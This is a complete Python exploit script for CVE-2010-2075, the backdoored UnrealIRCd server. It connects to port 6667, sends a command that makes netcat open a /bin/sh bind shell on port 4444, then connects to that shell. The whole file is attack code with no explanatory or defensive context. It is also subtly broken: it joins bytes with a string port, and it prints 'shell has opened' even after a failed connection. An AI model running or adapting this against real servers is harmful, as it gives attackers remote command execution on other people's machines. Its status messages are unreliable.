import socket
import subprocess
import sys
import time

class color:
	Red    = '\033[031m'
	Green  = '\033[032m'
	Yellow = '\033[033m'
	Blue   = '\033[034m'
	End    = '\033[0m'
	
def exploit(ip,port):
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	try:
		s.settimeout(2)
		s.connect((ip,6667))
		print(color.Blue +"[+] " + color.End + ip + ":6667 - Connected")
		print(s.recv(1024))
		print(color.Green +"[+] " + color.End + ip + ":6667 - Sending backdoor command...")
		s.send(b'AB; nc -lp ' + port + b' -e /bin/sh\n')
		print(color.Green +"[+] " + color.End + ip + ":6667 - Exploit success")
		s.close()
	except:
		print(color.Red + '[!!] Could not connect' + color.End)
	
	time.sleep(1)
	print(color.Green + "[+] " + color.End + ip +":"+port + " - shell has opened\n")
	subprocess.call(["nc " + ip + " " +port],shell=True)

if __name__ == '__main__':
	print(color.Yellow + "CVE-2010-2075" + color.End)
	exploit(sys.argv[1],'4444')
